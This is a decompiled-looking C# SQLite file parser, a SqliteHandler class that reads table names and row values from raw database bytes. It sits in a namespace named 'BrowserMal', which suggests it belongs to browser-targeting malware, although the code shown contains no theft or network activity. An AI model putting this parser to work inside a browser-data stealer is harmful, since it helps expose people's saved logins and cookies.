using Microsoft.VisualBasic;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace BrowserMal.SQLite
{
	public class SqliteHandler
	{
		private byte[] databaseBytes;

		private ulong mEncoding;

		private string[] fieldNames;

		private SqliteMasterEntry[] master_table_entries;

		private ushort pageSize;

		private byte[] SQLDataTypeSize;

		private TableEntry[] table_entries;

		private struct Record_header_field
		{
			public long size;

			public long type;
		}

		private struct SqliteMasterEntry
		{
			public long rowId;

            public string itemType;

			public string itemName;

			//public string astable_name;

			public long rootNum;

			public string sqlStatement;
		}

		private struct TableEntry
		{
			public long rowId;

			public string[] content;
		}

		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		public SqliteHandler(string baseName)
		{
			SQLDataTypeSize = new byte[] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
			checked
			{
				if (File.Exists(baseName))
				{
					FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
					string s = Strings.Space((int)FileSystem.LOF(1));
					FileSystem.FileGet(1, ref s, -1L, false);
					FileSystem.FileClose(new int[]
					{
						1
					});
					this.databaseBytes = Encoding.Default.GetBytes(s);

					if (string.Compare(Encoding.Default.GetString(this.databaseBytes, 0, 15), "SQLite format 3", StringComparison.Ordinal) != 0)
						throw new Exception("Not a valid SQLite 3 Database File");

					if (databaseBytes[52] != 0)
						throw new Exception("Auto-vacuum capable database is not supported");

					pageSize = (ushort)ConvertToInteger(16, 2);
					mEncoding = ConvertToInteger(56, 4);

					decimal d = new decimal(mEncoding);
					if (decimal.Compare(d, 0m) == 0)
					{
						mEncoding = 1UL;
					}
					this.ReadMasterTable(100UL);
				}
			}
		}

		private ulong ConvertToInteger(int startIndex, int Size)
		{
			if (Size > 8 | Size == 0)
				return 0UL;

			ulong num = 0UL;
			checked
			{
				for (int i = 0; i <= Size - 1; i++)
					num = (num << 8 | unchecked((ulong)this.databaseBytes[checked(startIndex + i)]));

				return num;
			}
		}

		private long CVL(int startIndex, int endIndex)
		{
			checked
			{
				endIndex++;
				byte[] array = new byte[8];
				int num = endIndex - startIndex;
				bool flag = false;

				if (num == 0 | num > 9)
					return 0L;

				if (num == 1)
				{
					array[0] = ((byte)(this.databaseBytes[startIndex] & 127));
					return BitConverter.ToInt64(array, 0);
				}

				if (num == 9)
					flag = true;

				int num2 = 1;
				int num3 = 7;
				int num4 = 0;
				if (flag)
				{
					array[0] = this.databaseBytes[endIndex - 1];
					endIndex--;
					num4 = 1;
				}
				for (int i = endIndex - 1; i >= startIndex; i += -1)
				{
					if (i - 1 >= startIndex)
					{
						array[num4] = (byte)(unchecked(((int)((byte)((uint)this.databaseBytes[i] >> (checked(num2 - 1) & 7 & 7))) & 255 >> num2) | (int)((byte)(this.databaseBytes[checked(i - 1)] << (num3 & 7 & 7)))));
						num2++;
						num4++;
						num3--;
					}
					else if (!flag)
					{
						array[num4] = (byte)((int)(unchecked((byte)((uint)this.databaseBytes[i] >> (checked(num2 - 1) & 7 & 7)))) & 255 >> num2);
					}
				}
				return BitConverter.ToInt64(array, 0);
			}
		}

		public int GetRowCount() => table_entries.Length;

		public string[] GetTableNames()
		{
			string[] array = null;
			int num = 0;
			checked
			{
				for (int i = 0; i <= master_table_entries.Length - 1; i++)
				{
					if (Operators.CompareString(this.master_table_entries[i].itemType, "table", false) == 0)
					{
						array = (string[])Utils.CopyArray(array, new string[num + 1]);
						array[num] = this.master_table_entries[i].itemName;
						num++;
					}
				}
				return array;
			}
		}

		public string GetValue(int row_num, int field)
		{
			if (row_num >= table_entries.Length)
				return null;

			if (field >= table_entries[row_num].content.Length)
				return null;

			return this.table_entries[row_num].content[field];
		}

		public string GetValue(int row_num, string field)
		{
			int num = -1;
			checked
			{
				for (int i = 0; i <= fieldNames.Length - 1; i++)
				{
					if (this.fieldNames[i].ToLower().CompareTo(field.ToLower()) == 0)
					{
						num = i;
						break;
					}
				}
				if (num == -1)
				{
					return null;
				}
				return GetValue(row_num, num);
			}
		}

		private int GVL(int startIndex)
		{
			if (startIndex > databaseBytes.Length)
			{
				return 0;
			}
			checked
			{
				int num = startIndex + 8;
				int num2 = num;
				for (int i = startIndex; i <= num2; i++)
				{
					if (i > this.databaseBytes.Length - 1)
					{
						return 0;
					}
					if ((this.databaseBytes[i] & 128) != 128)
					{
						return i;
					}
				}
				return startIndex + 8;
			}
		}

		private bool IsOdd(long value) => (value & 1L) == 1L;

		private void ReadMasterTable(ulong Offset)
		{
			checked
			{
				if (this.databaseBytes[(int)Offset] == 13)
				{
					decimal num = new decimal(Offset);
					decimal num2 = new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(num, 3m)), 2));
					ushort num3 = Convert.ToUInt16(decimal.Subtract(num2, 1m));
					int num4 = 0;
					if (this.master_table_entries != null)
					{
						num4 = this.master_table_entries.Length;
						this.master_table_entries = (SqliteMasterEntry[])Utils.CopyArray(this.master_table_entries, new SqliteMasterEntry[this.master_table_entries.Length + (int)num3 + 1]);
					}
					else
					{
						this.master_table_entries = new SqliteMasterEntry[(int)(num3 + 1)];
					}

					for (int i = 0; i <= (int)num3; i++)
					{
						num2 = new decimal(Offset);
						decimal d = decimal.Add(num2, 8m);
						num = new decimal(i * 2);
						ulong num8 = this.ConvertToInteger(Convert.ToInt32(decimal.Add(d, num)), 2);
						num2 = new decimal(Offset);
						if (decimal.Compare(num2, 100m) != 0)
						{
							num8 += Offset;
						}
						int num9 = this.GVL((int)num8);
						_ = this.CVL((int)num8, num9);
						num2 = new decimal(num8);
						decimal d2 = num2;
						num = new decimal(num9);
						decimal d3 = num;
						decimal num11 = new decimal(num8);
						int num12 = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(d2, decimal.Subtract(d3, num11)), 1m)));
						SqliteMasterEntry[] array = this.master_table_entries;
						int num13 = num4 + i;
						num11 = new decimal(num8);
						decimal d4 = num11;
						num2 = new decimal(num9);
						decimal d5 = num2;
						num = new decimal(num8);
						array[num13].rowId = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(d4, decimal.Subtract(d5, num)), 1m)), num12);
						num11 = new decimal(num8);
						decimal d6 = num11;
						num2 = new decimal(num12);
						decimal d7 = num2;
						num = new decimal(num8);
						num8 = Convert.ToUInt64(decimal.Add(decimal.Add(d6, decimal.Subtract(d7, num)), 1m));
						num9 = this.GVL((int)num8);
						num12 = num9;
						long value = this.CVL((int)num8, num9);
						long[] array2 = new long[5];
						int num14 = 0;
						do
						{
							num9 = num12 + 1;
							num12 = this.GVL(num9);
							array2[num14] = this.CVL(num9, num12);
							if (array2[num14] > 9L)
							{
								if (this.IsOdd(array2[num14]))
								{
									array2[num14] = (long)Math.Round(Math.Round((double)(array2[num14] - 13L) / 2.0));
								}
								else
								{
									array2[num14] = (long)Math.Round(Math.Round((double)(array2[num14] - 12L) / 2.0));
								}
							}
							else
							{
								array2[num14] = (long)(unchecked((ulong)this.SQLDataTypeSize[checked((int)array2[num14])]));
							}
							num14++;
						}
						while (num14 <= 4);
						num11 = new decimal(this.mEncoding);
						if (decimal.Compare(num11, 1m) == 0)
						{
							SqliteMasterEntry[] array3 = this.master_table_entries;
							int num15 = num4 + i;
							Encoding @default = Encoding.Default;
							byte[] bytes = this.databaseBytes;
							num2 = new decimal(num8);
							decimal d8 = num2;
							num = new decimal(value);
							array3[num15].itemType = @default.GetString(bytes, Convert.ToInt32(decimal.Add(d8, num)), (int)array2[0]);
						}
						else
						{
							num11 = new decimal(this.mEncoding);
							if (decimal.Compare(num11, 2m) == 0)
							{
								SqliteMasterEntry[] array4 = this.master_table_entries;
								int num16 = num4 + i;
								Encoding unicode = Encoding.Unicode;
								byte[] bytes2 = this.databaseBytes;
								num2 = new decimal(num8);
								decimal d9 = num2;
								num = new decimal(value);
								array4[num16].itemType = unicode.GetString(bytes2, Convert.ToInt32(decimal.Add(d9, num)), (int)array2[0]);
							}
							else
							{
								num11 = new decimal(this.mEncoding);
								if (decimal.Compare(num11, 3m) == 0)
								{
									SqliteMasterEntry[] array5 = this.master_table_entries;
									int num17 = num4 + i;
									Encoding bigEndianUnicode = Encoding.BigEndianUnicode;
									byte[] bytes3 = this.databaseBytes;
									num2 = new decimal(num8);
									decimal d10 = num2;
									num = new decimal(value);
									array5[num17].itemType = bigEndianUnicode.GetString(bytes3, Convert.ToInt32(decimal.Add(d10, num)), (int)array2[0]);
								}
							}
						}
						num11 = new decimal(this.mEncoding);
						decimal num19;
						if (decimal.Compare(num11, 1m) == 0)
						{
							SqliteMasterEntry[] array6 = this.master_table_entries;
							int num18 = num4 + i;
							Encoding default2 = Encoding.Default;
							byte[] bytes4 = this.databaseBytes;
							num2 = new decimal(num8);
							decimal d11 = num2;
							num = new decimal(value);
							decimal d12 = decimal.Add(d11, num);
							num19 = new decimal(array2[0]);
							array6[num18].itemName = default2.GetString(bytes4, Convert.ToInt32(decimal.Add(d12, num19)), (int)array2[1]);
						}
						else
						{
							num19 = new decimal(this.mEncoding);
							if (decimal.Compare(num19, 2m) == 0)
							{
								SqliteMasterEntry[] array7 = this.master_table_entries;
								int num20 = num4 + i;
								Encoding unicode2 = Encoding.Unicode;
								byte[] bytes5 = this.databaseBytes;
								num11 = new decimal(num8);
								decimal d13 = num11;
								num2 = new decimal(value);
								decimal d14 = decimal.Add(d13, num2);
								num = new decimal(array2[0]);
								array7[num20].itemName = unicode2.GetString(bytes5, Convert.ToInt32(decimal.Add(d14, num)), (int)array2[1]);
							}
							else
							{
								num19 = new decimal(this.mEncoding);
								if (decimal.Compare(num19, 3m) == 0)
								{
									SqliteMasterEntry[] array8 = this.master_table_entries;
									int num21 = num4 + i;
									Encoding bigEndianUnicode2 = Encoding.BigEndianUnicode;
									byte[] bytes6 = this.databaseBytes;
									num11 = new decimal(num8);
									decimal d15 = num11;
									num2 = new decimal(value);
									decimal d16 = decimal.Add(d15, num2);
									num = new decimal(array2[0]);
									array8[num21].itemName = bigEndianUnicode2.GetString(bytes6, Convert.ToInt32(decimal.Add(d16, num)), (int)array2[1]);
								}
							}
						}
						SqliteMasterEntry[] array9 = this.master_table_entries;
						int num22 = num4 + i;
						num19 = new decimal(num8);
						decimal d17 = num19;
						num11 = new decimal(value);
						decimal d18 = decimal.Add(d17, num11);
						num2 = new decimal(array2[0]);
						decimal d19 = decimal.Add(d18, num2);
						num = new decimal(array2[1]);
						decimal d20 = decimal.Add(d19, num);
						decimal num23 = new decimal(array2[2]);
						array9[num22].rootNum = (long)this.ConvertToInteger(Convert.ToInt32(decimal.Add(d20, num23)), (int)array2[3]);
						num23 = new decimal(this.mEncoding);
						if (decimal.Compare(num23, 1m) == 0)
						{
							SqliteMasterEntry[] array10 = this.master_table_entries;
							int num24 = num4 + i;
							Encoding default3 = Encoding.Default;
							byte[] bytes7 = this.databaseBytes;
							num19 = new decimal(num8);
							decimal d21 = num19;
							num11 = new decimal(value);
							decimal d22 = decimal.Add(d21, num11);
							num2 = new decimal(array2[0]);
							decimal d23 = decimal.Add(d22, num2);
							num = new decimal(array2[1]);
							decimal d24 = decimal.Add(d23, num);
							decimal num25 = new decimal(array2[2]);
							decimal d25 = decimal.Add(d24, num25);
							decimal num26 = new decimal(array2[3]);
							array10[num24].sqlStatement = default3.GetString(bytes7, Convert.ToInt32(decimal.Add(d25, num26)), (int)array2[4]);
						}
						else
						{
							decimal num26 = new decimal(this.mEncoding);
							if (decimal.Compare(num26, 2m) == 0)
							{
								SqliteMasterEntry[] array11 = this.master_table_entries;
								int num27 = num4 + i;
								Encoding unicode3 = Encoding.Unicode;
								byte[] bytes8 = this.databaseBytes;
								decimal num25 = new decimal(num8);
								decimal d26 = num25;
								num23 = new decimal(value);
								decimal d27 = decimal.Add(d26, num23);
								num19 = new decimal(array2[0]);
								decimal d28 = decimal.Add(d27, num19);
								num11 = new decimal(array2[1]);
								decimal d29 = decimal.Add(d28, num11);
								num2 = new decimal(array2[2]);
								decimal d30 = decimal.Add(d29, num2);
								num = new decimal(array2[3]);
								array11[num27].sqlStatement = unicode3.GetString(bytes8, Convert.ToInt32(decimal.Add(d30, num)), (int)array2[4]);
							}
							else
							{
								num26 = new decimal(this.mEncoding);
								if (decimal.Compare(num26, 3m) == 0)
								{
									SqliteMasterEntry[] array12 = this.master_table_entries;
									int num28 = num4 + i;
									Encoding bigEndianUnicode3 = Encoding.BigEndianUnicode;
									byte[] bytes9 = this.databaseBytes;
									decimal num25 = new decimal(num8);
									decimal d31 = num25;
									num23 = new decimal(value);
									decimal d32 = decimal.Add(d31, num23);
									num19 = new decimal(array2[0]);
									decimal d33 = decimal.Add(d32, num19);
									num11 = new decimal(array2[1]);
									decimal d34 = decimal.Add(d33, num11);
									num2 = new decimal(array2[2]);
									decimal d35 = decimal.Add(d34, num2);
									num = new decimal(array2[3]);
									array12[num28].sqlStatement = bigEndianUnicode3.GetString(bytes9, Convert.ToInt32(decimal.Add(d35, num)), (int)array2[4]);
								}
							}
						}
					}
				}
				else if (this.databaseBytes[(int)Offset] == 5)
				{
					decimal num26 = new decimal(Offset);
					decimal num25 = new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(num26, 3m)), 2));
					ushort num29 = Convert.ToUInt16(decimal.Subtract(num25, 1m));
					int num30 = (int)num29;
					int num31 = 0;
					int num32 = num30;
					decimal num23;
					for (int j = num31; j <= num32; j++)
					{
						num26 = new decimal(Offset);
						decimal d36 = decimal.Add(num26, 12m);
						num25 = new decimal(j * 2);
						ushort num33 = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(d36, num25)), 2);
						num26 = new decimal(Offset);
						if (decimal.Compare(num26, 100m) == 0)
						{
							num25 = new decimal(this.ConvertToInteger((int)num33, 4));
							decimal d37 = decimal.Subtract(num25, 1m);
							num23 = new decimal((int)this.pageSize);
							this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(d37, num23)));
						}
						else
						{
							num26 = new decimal(this.ConvertToInteger((int)(Offset + unchecked((ulong)num33)), 4));
							decimal d38 = decimal.Subtract(num26, 1m);
							num25 = new decimal((int)this.pageSize);
							this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(d38, num25)));
						}
					}
					num26 = new decimal(Offset);
					num25 = new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(num26, 8m)), 4));
					decimal d39 = decimal.Subtract(num25, 1m);
					num23 = new decimal((int)this.pageSize);
					this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(d39, num23)));
				}
			}
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00005520 File Offset: 0x00003720
		public bool ReadTable(string TableName)
		{
			int num = -1;
			checked
			{
				int num2 = this.master_table_entries.Length - 1;
				int num3 = 0;
				int num4 = num2;
				for (int i = num3; i <= num4; i++)
				{
					if (string.Compare(this.master_table_entries[i].itemName.ToLower(), TableName.ToLower(), StringComparison.Ordinal) == 0)
					{
						num = i;
						break;
					}
				}
				if (num == -1)
				{
					return false;
				}
				string[] array = this.master_table_entries[num].sqlStatement.Substring(this.master_table_entries[num].sqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(new char[]
				{
					','
				});
				int num5 = array.Length - 1;
				int num6 = 0;
				int num7 = num5;
				for (int j = num6; j <= num7; j++)
				{
					array[j] = array[j].TrimStart(new char[0]);
					int num8 = array[j].IndexOf(" ", StringComparison.Ordinal);
					if (num8 > 0)
					{
						array[j] = array[j].Substring(0, num8);
					}
					if (array[j].IndexOf("UNIQUE", StringComparison.Ordinal) == 0)
					{
						break;
					}
					this.fieldNames = (string[])Utils.CopyArray(this.fieldNames, new string[j + 1]);
					this.fieldNames[j] = array[j];
				}
				return this.ReadTableFromOffset((ulong)((this.master_table_entries[num].rootNum - 1L) * (long)(unchecked((ulong)this.pageSize))));
			}
		}

		private bool ReadTableFromOffset(ulong offset)
		{
			checked
			{
				if (this.databaseBytes[(int)offset] == 13)
				{
					decimal num = new decimal(offset);
					decimal num2 = new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(num, 3m)), 2));
					int num3 = Convert.ToInt32(decimal.Subtract(num2, 1m));
					int num4 = 0;
					if (this.table_entries != null)
					{
						num4 = this.table_entries.Length;
						this.table_entries = (TableEntry[])Utils.CopyArray(this.table_entries, new TableEntry[this.table_entries.Length + num3 + 1]);
					}
					else
					{
						this.table_entries = new TableEntry[num3 + 1];
					}
					int num5 = num3;
					int num6 = 0;
					int num7 = num5;
					for (int i = num6; i <= num7; i++)
					{
						Record_header_field[] array = null;
						num2 = new decimal(offset);
						decimal d = decimal.Add(num2, 8m);
						num = new decimal(i * 2);
						ulong num8 = this.ConvertToInteger(Convert.ToInt32(decimal.Add(d, num)), 2);
						num2 = new decimal(offset);
						if (decimal.Compare(num2, 100m) != 0)
						{
							num8 += offset;
						}
						int num9 = this.GVL((int)num8);
						long num10 = this.CVL((int)num8, num9);
						num2 = new decimal(num8);
						decimal d2 = num2;
						num = new decimal(num9);
						decimal d3 = num;
						decimal num11 = new decimal(num8);
						int num12 = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(d2, decimal.Subtract(d3, num11)), 1m)));
						TableEntry[] array2 = this.table_entries;
						int num13 = num4 + i;
						num11 = new decimal(num8);
						decimal d4 = num11;
						num2 = new decimal(num9);
						decimal d5 = num2;
						num = new decimal(num8);
						array2[num13].rowId = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(d4, decimal.Subtract(d5, num)), 1m)), num12);
						num11 = new decimal(num8);
						decimal d6 = num11;
						num2 = new decimal(num12);
						decimal d7 = num2;
						num = new decimal(num8);
						num8 = Convert.ToUInt64(decimal.Add(decimal.Add(d6, decimal.Subtract(d7, num)), 1m));
						num9 = this.GVL((int)num8);
						num12 = num9;
						long num14 = this.CVL((int)num8, num9);
						num11 = new decimal(num8);
						decimal d8 = num11;
						num2 = new decimal(num9);
						long num15 = Convert.ToInt64(decimal.Add(decimal.Subtract(d8, num2), 1m));
						int num16 = 0;
						while (num15 < num14)
						{
							array = (Record_header_field[])Utils.CopyArray(array, new Record_header_field[num16 + 1]);
							num9 = num12 + 1;
							num12 = this.GVL(num9);
							array[num16].type = this.CVL(num9, num12);
							if (array[num16].type > 9L)
							{
								array[num16].size = (this.IsOdd(array[num16].type) ? ((long)Math.Round(Math.Round((double)(array[num16].type - 13L) / 2.0))) : ((long)Math.Round(Math.Round((double)(array[num16].type - 12L) / 2.0))));
							}
							else
							{
								array[num16].size = (long)(unchecked((ulong)this.SQLDataTypeSize[checked((int)array[num16].type)]));
							}
							num15 = num15 + unchecked((long)(checked(num12 - num9))) + 1L;
							num16++;
						}
						this.table_entries[num4 + i].content = new string[array.Length - 1 + 1];
						int num17 = 0;
						int num18 = array.Length - 1;
						int num19 = 0;
						int num20 = num18;
						for (int j = num19; j <= num20; j++)
						{
							if (array[j].type > 9L)
							{
								if (!this.IsOdd(array[j].type))
								{
									num11 = new decimal(this.mEncoding);
									if (decimal.Compare(num11, 1m) == 0)
									{
										string[] content = this.table_entries[num4 + i].content;
										int num21 = j;
										Encoding @default = Encoding.Default;
										byte[] bytes = this.databaseBytes;
										num2 = new decimal(num8);
										decimal d9 = num2;
										num = new decimal(num14);
										decimal d10 = decimal.Add(d9, num);
										decimal num22 = new decimal(num17);
										content[num21] = @default.GetString(bytes, Convert.ToInt32(decimal.Add(d10, num22)), (int)array[j].size);
									}
									else
									{
										decimal num22 = new decimal(this.mEncoding);
										if (decimal.Compare(num22, 2m) == 0)
										{
											string[] content2 = this.table_entries[num4 + i].content;
											int num23 = j;
											Encoding unicode = Encoding.Unicode;
											byte[] bytes2 = this.databaseBytes;
											num11 = new decimal(num8);
											decimal d11 = num11;
											num2 = new decimal(num14);
											decimal d12 = decimal.Add(d11, num2);
											num = new decimal(num17);
											content2[num23] = unicode.GetString(bytes2, Convert.ToInt32(decimal.Add(d12, num)), (int)array[j].size);
										}
										else
										{
											num22 = new decimal(this.mEncoding);
											if (decimal.Compare(num22, 3m) == 0)
											{
												string[] content3 = this.table_entries[num4 + i].content;
												int num24 = j;
												Encoding bigEndianUnicode = Encoding.BigEndianUnicode;
												byte[] bytes3 = this.databaseBytes;
												num11 = new decimal(num8);
												decimal d13 = num11;
												num2 = new decimal(num14);
												decimal d14 = decimal.Add(d13, num2);
												num = new decimal(num17);
												content3[num24] = bigEndianUnicode.GetString(bytes3, Convert.ToInt32(decimal.Add(d14, num)), (int)array[j].size);
											}
										}
									}
								}
								else
								{
									string[] content4 = this.table_entries[num4 + i].content;
									int num25 = j;
									Encoding default2 = Encoding.Default;
									byte[] bytes4 = this.databaseBytes;
									decimal num22 = new decimal(num8);
									decimal d15 = num22;
									num11 = new decimal(num14);
									decimal d16 = decimal.Add(d15, num11);
									num2 = new decimal(num17);
									content4[num25] = default2.GetString(bytes4, Convert.ToInt32(decimal.Add(d16, num2)), (int)array[j].size);
								}
							}
							else
							{
								string[] content5 = this.table_entries[num4 + i].content;
								int num26 = j;
								decimal num22 = new decimal(num8);
								decimal d17 = num22;
								num11 = new decimal(num14);
								decimal d18 = decimal.Add(d17, num11);
								num2 = new decimal(num17);
								content5[num26] = Conversions.ToString(this.ConvertToInteger(Convert.ToInt32(decimal.Add(d18, num2)), (int)array[j].size));
							}
							num17 += (int)array[j].size;
						}
					}
				}
				else if (this.databaseBytes[(int)offset] == 5)
				{
					decimal num22 = new decimal(offset);
					decimal num11 = new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(num22, 3m)), 2));
					ushort num27 = Convert.ToUInt16(decimal.Subtract(num11, 1m));
					int num28 = (int)num27;
					int num29 = 0;
					int num30 = num28;
					for (int k = num29; k <= num30; k++)
					{
						num22 = new decimal(offset);
						decimal d19 = decimal.Add(num22, 12m);
						num11 = new decimal(k * 2);
						ushort num31 = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(d19, num11)), 2);
						num22 = new decimal(this.ConvertToInteger((int)(offset + unchecked((ulong)num31)), 4));
						decimal d20 = decimal.Subtract(num22, 1m);
						num11 = new decimal((int)this.pageSize);
						this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(d20, num11)));
					}
					num22 = new decimal(offset);
					num11 = new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(num22, 8m)), 4));
					decimal d21 = decimal.Subtract(num11, 1m);
					decimal num2 = new decimal((int)this.pageSize);
					this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(d21, num2)));
				}
				return true;
			}
		}
	}
}